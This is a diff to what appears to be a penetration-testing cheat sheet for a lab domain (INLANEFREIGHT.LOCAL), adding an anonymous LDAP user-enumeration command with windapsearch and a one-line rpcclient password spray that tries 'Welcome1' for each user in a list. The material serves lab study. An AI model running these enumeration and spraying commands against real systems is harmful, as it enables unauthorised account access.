@@ -380,6 +380,7 @@ $ braa <community string>@<IP address>:.1.*
 ```
 $ ldapsearch -h <IP address> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 $ ldapsearch -h <IP address> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"
+$ ./windapsearch.py --dc-ip <IP address> -u "" -U
 ```
 
 - R-Services (port 512/513/514)
@@ -1370,6 +1371,12 @@ https://github.com/dafthack/MailSniper
 
 ```
 https://github.com/ustayready/CredKing
+```
+
+- Rpcclient Password Spray
+
+```
+$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
 - Netexec
